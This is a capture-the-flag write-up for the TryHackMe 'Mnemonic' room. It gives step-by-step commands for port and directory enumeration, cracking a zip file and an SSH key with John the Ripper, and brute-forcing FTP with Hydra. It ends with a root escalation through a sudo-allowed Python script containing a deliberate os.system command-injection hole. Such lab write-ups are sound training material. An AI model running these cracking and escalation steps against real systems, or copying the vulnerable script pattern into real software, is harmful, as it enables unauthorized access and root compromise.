# [Mnemonic](https://tryhackme.com/room/mnemonic)

## I hope you have fun.

# Mnemonic

Hit me!
You need 1 things : hurry up

# Enumerate

### How many open ports?

1. Start with a comprehensive Nmap scan to discover all open ports and their services:

```bash
nmap -sV -p- <TARGET_IP>
```

**Result:**

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**Answer:** 3

---

### what is the ssh port number?

1. From the Nmap scan results, we can see SSH is running on a non-standard port instead of the default port 22.

**Answer:** 1337

---

### what is the name of the secret file?

1. Use Gobuster to enumerate directories and files on the web server:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -t 50
```

**Results:**

```
/webmasters           (Status: 301) [Size: 319] [--> http://<TARGET_IP>/webmasters/]
/robots.txt           (Status: 200) [Size: 48]
```

2. Enumerate the `/webmasters/` directory further to find subdirectories:

```bash
gobuster dir -u http://<TARGET_IP>/webmasters/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Results:**

```
/admin                (Status: 301) [Size: 325] [--> http://<TARGET_IP>/webmasters/admin/]
/backups              (Status: 301) [Size: 327] [--> http://<TARGET_IP>/webmasters/backups/]
```

3. Continue enumeration in the `/backups/` directory, looking for secret file:

```bash
gobuster dir -u http://<TARGET_IP>/webmasters/backups/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,zip -t 50
```

**Results:**

```
/backups.zip          (Status: 200) [Size: 409]
```

**Answer:** backups.zip

---

# Credentials

### ftp user name?

1. Download the zip file from `http://<TARGET_IP>/webmasters/backups/backups.zip`.

2. Crack the zip file password using John the Ripper:

```bash
zip2john backups.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<img width="1025" height="271" alt="SCREEN01" src="https://github.com/user-attachments/assets/b6e991fb-7abf-4343-b20e-1bd9ea70bb8e" />

**Result:** 00385007

2. Read the contents of `backups/note.txt`:

**Content of note.txt**

```
@vill

James new ftp username: ftpuser
we have to work hard
```

**Answer:** ftpuser

---

### ftp password?

1. Use Hydra to brute force the FTP password with the discovered username:

```bash
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
```

<img width="1039" height="228" alt="SCREEN02" src="https://github.com/user-attachments/assets/e7860093-e9dc-43a6-b1b0-9fb09432cbe5" />

**Answer:** love4ever

---

### What is the ssh username?

1. Login to the FTP server with the discovered credentials and explore the available files:

```bash
ftp <TARGET_IP>
ftpuser
love4ever
ls -la
cd data-4
ls -la
get not.txt
get id_rsa
```

**Content of not.txt**

```
james change ftp user password
```

**Answer:** james

---

### What is the ssh password?

1. Check if the `id_rsa` private key is encrypted by examining its header:

```bash
cat id_rsa
```

**Result:**

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,01762A15A5B935E96A1CF34704C79AC3
...
```

The key is encrypted and requires a passphrase to use.

2. Use ssh2john to extract the hash and then crack it with John the Ripper:

```bash
ssh2john id_rsa > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
```

<img width="764" height="210" alt="SCREEN03" src="https://github.com/user-attachments/assets/d1d52189-717f-4641-8b64-382865839d2d" />

**Answer:** bluelove

---

### What is the condor password?

_mnemonic encryption "image based"_

1. Connect to the target via SSH using james credentials:

```bash
ssh -p 1337 james@<TARGET_IP>
# Password: bluelove
```

2. Explore the home directory and read available files:

```bash
ls -la
cat noteforjames.txt
cat 6450.txt
```

**noteforjames.txt**

```
@vill

james i found a new encryption İmage based name is Mnemonic

I created the condor password. don't forget the beers on saturday
```

**6450.txt**

```
5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
15355494
```

These numbers appear to be encoded data related to the Mnemonic encryption.

3. List files in condor's home directory:

```bash
ls -la /home/condor
```

**Results:**

```
ls: cannot access '/home/condor/..': Permission denied
ls: cannot access '/home/condor/'\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\''': Permission denied
ls: cannot access '/home/condor/.gnupg': Permission denied
ls: cannot access '/home/condor/.bash_logout': Permission denied
ls: cannot access '/home/condor/.bashrc': Permission denied
ls: cannot access '/home/condor/.profile': Permission denied
ls: cannot access '/home/condor/.cache': Permission denied
ls: cannot access '/home/condor/.bash_history': Permission denied
ls: cannot access '/home/condor/.': Permission denied
ls: cannot access '/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==': Permission denied
total 0
d????????? ? ? ? ?            ?  .
d????????? ? ? ? ?            ?  ..
d????????? ? ? ? ?            ? 'aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw=='
l????????? ? ? ? ?            ?  .bash_history
-????????? ? ? ? ?            ?  .bash_logout
-????????? ? ? ? ?            ?  .bashrc
d????????? ? ? ? ?            ?  .cache
d????????? ? ? ? ?            ?  .gnupg
-????????? ? ? ? ?            ?  .profile
d????????? ? ? ? ?            ? ''\''VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='\'''
```

We can see two interesting Base64-encoded directory/file names in condor's home directory.

4. Decode the Base64-encoded filename `aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==` using [CyberChef](https://gchq.github.io/CyberChef/) or the command line:

**Result:** `https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg`

5. Download the image from the decoded URL: `https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg`.

6. Clone the [Mnemonic](https://github.com/MustafaTanguner/Mnemonic) tool repository from GitHub:

```bash
git clone https://github.com/MustafaTanguner/Mnemonic.git
```

7. Run the Mnemonic decryption tool with the downloaded image and the numbers from `6450.txt`:

```bash
python3 Mnemonic/Mnemonic.py
# Enter the path to the image: /path/to/maxresdefault.jpg
# Select option: 2 (Decode)
# Enter the path to encoded file: /path/to/6450.txt
```

<img width="381" height="193" alt="SCREEN04" src="https://github.com/user-attachments/assets/aa47bc32-cdf0-48b2-8615-cdb2591ac52a" />

**Answer:** pasificbell1981

---

# Hack the machine

### user.txt

1. Login as condor using SSH with the discovered password:

```bash
ssh -p 1337 condor@<TARGET_IP>
# Password: pasificbell1981
```

2. List files in condor's home directory:

```bash
ls
```

3. Decode the Base64 encoded directory name `VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==` to get the user flag:

---

### root.txt

_THM{MD5}_

1. Check sudo privileges for the condor user:

```bash
sudo -l
```

**Result:**

```
User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
```

Condor can run a Python script as root without a password.

2. Examine the Python script to identify potential privilege escalation vectors:

```bash
cat /bin/examplecode.py
```

**Result:**

```python
#!/usr/bin/python3
import os
import time
import sys
def text(): #text print


	print("""
	------------information systems script beta--------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	---------------------------------------------------
	----------------@author villwocki------------------""")
	time.sleep(2)
	print("\nRunning...")
	time.sleep(2)
	os.system(command="clear")
	main()


def main():
	info()
	while True:
		select = int(input("\nSelect:"))

		if select == 1:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ip a")
			print("Main Menü press '0' ")
			print(x)

		if select == 2:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ifconfig")
			print(x)

		if select == 3:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="ip route show")
			print(x)

		if select == 4:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="cat /etc/os-release")
			print(x)

		if select == 0:
			time.sleep(1)
			ex = str(input("are you sure you want to quit ? yes : "))

			if ex == ".":
				print(os.system(input("\nRunning....")))
			if ex == "yes " or "y":
				sys.exit()

		if select == 5: #root
			time.sleep(1)
			print("\nRunning")
			time.sleep(2)
			print(".......")
			time.sleep(2)
			print("System rebooting....")
			time.sleep(2)
			x = os.system(command="shutdown now")
			print(x)

		if select == 6:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="date")
			print(x)

		if select == 7:
			time.sleep(1)
			print("\nRunning")
			time.sleep(1)
			x = os.system(command="rm -r /tmp/*")
			print(x)


def info(): #info print function
	print("""
		#Network Connections   [1]
		#Show \u0130fconfig    [2]
		#Show ip route         [3]
		#Show Os-release       [4]
		#Root Shell Spawn      [5]
		#Print date            [6]
		#Exit                  [0]
	""")

def run(): # run function
	text()

run()
```

The vulnerability is in the `select == 0` condition. When the user selects option 0 (exit), they are asked to confirm. If they enter `.` (a single dot), the script executes `os.system(input("\nRunning...."))`, allowing arbitrary command execution as root.

3. Run the script with sudo and exploit the vulnerability:

```bash
sudo python3 /bin/examplecode.py
0
.
cat /root/root.txt
```

<img width="383" height="422" alt="SCREEN05" src="https://github.com/user-attachments/assets/b236da2d-3ceb-41ca-a17f-41687b6e0eea" />

4. Encrypt the flag with MD5 in [CyberChef](https://gchq.github.io/CyberChef/).
